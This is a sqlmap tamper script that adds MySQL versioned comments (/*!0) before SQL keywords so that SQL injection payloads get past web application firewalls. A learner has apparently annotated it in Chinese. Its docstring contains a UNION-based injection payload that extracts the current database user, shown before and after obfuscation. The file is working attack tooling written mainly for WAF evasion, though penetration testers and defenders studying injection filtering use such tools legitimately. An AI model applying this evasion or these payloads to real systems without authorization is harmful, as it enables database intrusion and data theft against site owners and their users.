#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ = PRIORITY.HIGHER

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s < 5.1" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Adds (MySQL) versioned comment before each keyword

    Requirement:
        * MySQL < 5.1

    Tested against:
        * MySQL 4.0.18, 5.0.22

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL
        * Used during the ModSecurity SQL injection challenge,
          http://modsecurity.org/demo/challenge.html

    >>> tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")
    "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
    """

    def process(match):
        word = match.group('word')
        ##调用下面的payload匹配规则并声明为word提供给下面upper使用
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!0%s" % word)
            ##根据上面的word（upper）调用特征确认后添加/*!0%s
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, retVal)
        ##匹配规则
        retVal = retVal.replace(" /*!0", "/*!0")
        ##并且将/*!0%s前的空格删掉
    return retVal
